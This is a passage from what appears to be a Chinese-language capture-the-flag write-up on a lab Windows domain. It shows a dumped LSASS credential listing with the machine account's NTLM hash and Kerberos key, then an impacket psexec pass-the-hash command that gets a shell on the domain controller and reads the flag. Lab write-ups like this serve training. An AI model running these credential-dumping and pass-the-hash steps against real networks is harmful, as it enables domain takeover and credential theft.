Logon Server      : (null)
Logon Time        : 2026/3/3 20:00:16
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 20d1b45c86589161166f19de3a74ef7d
	 * SHA1     : 299f362ad59d9292f590b9cd8342656f6e5608d6
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : e5 49 6b 5f 8c 85 b0 49 be 23 a9 20 bb ef 8c 30 52 a3 7d 80 9c e1 e0 8a 98 52 cb 2e 6d 12 66 e7 98 00 aa 8d cc 9c 57 5e f0 10 5c 3a 6c 52 80 0d a6 7c df 63 de a1 af b0 3a d6 d6 90 5e c9 7b d4 14 f1 37 a9 a7 ac 81 fc aa 04 d7 4e dc 3c eb d7 56 37 29 75 f2 1d 8b e2 b5 59 7b 39 57 5f 24 32 0c b7 d9 40 c2 80 09 b7 29 34 6f b4 19 f2 a0 da 88 b5 b6 c4 9a c0 82 3c 53 88 63 41 29 7b a7 09 9a 6d 0e 2b c1 d9 9c c7 4d fe 07 b8 ce 41 55 af 1d 0a 47 93 3f dd 34 a6 cc df 81 9d 71 b9 e0 bf c6 c9 fb 4f 3e 86 30 fd 43 54 8d 85 f1 2b a3 37 e9 e1 51 4b ed 1e 16 d0 66 c2 5f 2d 59 4c b4 1b b6 98 d8 6b 67 b6 ce 95 9b 14 36 44 7a a5 38 e7 1d bb 85 94 ae a4 aa fd 46 56 ef 64 d7 e2 dd ce 31 02 80 e6 8a da f1 4c de 41 4d 68 7e 85 22 03 
	ssp :	
	credman :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2026/3/3 19:22:50
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2026/3/3 19:22:47
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 54886 (00000000:0000d666)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/3/3 19:22:47
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 20d1b45c86589161166f19de3a74ef7d
	 * SHA1     : 299f362ad59d9292f590b9cd8342656f6e5608d6
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : WIN2016$
	 * Domain   : xiaorang.lab
	 * Password : e5 49 6b 5f 8c 85 b0 49 be 23 a9 20 bb ef 8c 30 52 a3 7d 80 9c e1 e0 8a 98 52 cb 2e 6d 12 66 e7 98 00 aa 8d cc 9c 57 5e f0 10 5c 3a 6c 52 80 0d a6 7c df 63 de a1 af b0 3a d6 d6 90 5e c9 7b d4 14 f1 37 a9 a7 ac 81 fc aa 04 d7 4e dc 3c eb d7 56 37 29 75 f2 1d 8b e2 b5 59 7b 39 57 5f 24 32 0c b7 d9 40 c2 80 09 b7 29 34 6f b4 19 f2 a0 da 88 b5 b6 c4 9a c0 82 3c 53 88 63 41 29 7b a7 09 9a 6d 0e 2b c1 d9 9c c7 4d fe 07 b8 ce 41 55 af 1d 0a 47 93 3f dd 34 a6 cc df 81 9d 71 b9 e0 bf c6 c9 fb 4f 3e 86 30 fd 43 54 8d 85 f1 2b a3 37 e9 e1 51 4b ed 1e 16 d0 66 c2 5f 2d 59 4c b4 1b b6 98 d8 6b 67 b6 ce 95 9b 14 36 44 7a a5 38 e7 1d bb 85 94 ae a4 aa fd 46 56 ef 64 d7 e2 dd ce 31 02 80 e6 8a da f1 4c de 41 4d 68 7e 85 22 03 
	ssp :	
	credman :	

Authentication Id : 0 ; 25102 (00000000:0000620e)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2026/3/3 19:22:46
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * NTLM     : 20d1b45c86589161166f19de3a74ef7d
	 * SHA1     : 299f362ad59d9292f590b9cd8342656f6e5608d6
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN2016$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2026/3/3 19:22:46
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WIN2016$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : win2016$
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

```

psexec直接连接dc

```
E:\exploit\tools\impacket\examples>python psexec.py WIN2016$@172.22.8.15 -hashes :20d1b45c86589161166f19de3a74ef7d
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 172.22.8.15.....
[*] Found writable share ADMIN$
[*] Uploading file jEKsdwoI.exe
[*] Opening SVCManager on 172.22.8.15.....
[*] Creating service yClu on 172.22.8.15.....
[*] Starting service yClu.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [�汾 10.0.20348.707]

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
(c) Microsoft Corporation����������Ȩ����


C:\Windows\system32> chcp 65001&& dir C:\ /S /B |findstr flag
Active code page: 65001
C:\Users\Administrator\flag
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag03.txt.lnk
C:\Users\Administrator\flag\flag03.txt

C:\Windows\system32> type C:\Users\Administrator\flag\flag03.txt
 _________               __    _                  _
|  _   _  |             [  |  (_)                / |_
|_/ | | \_|.--.   .---.  | |  __  .---.  _ .--. `| |-'
    | |   ( (`\] / /'`\] | | [  |/ /__\\[ `.-. | | |
   _| |_   `'.'. | \__.  | |  | || \__., | | | | | |,
  |_____| [\__) )'.___.'[___][___]'.__.'[___||__]\__/


Congratulations! ! !

flag03: flag{789cb5be-f654-40fc-bbe7-b80eb43701cd}
```

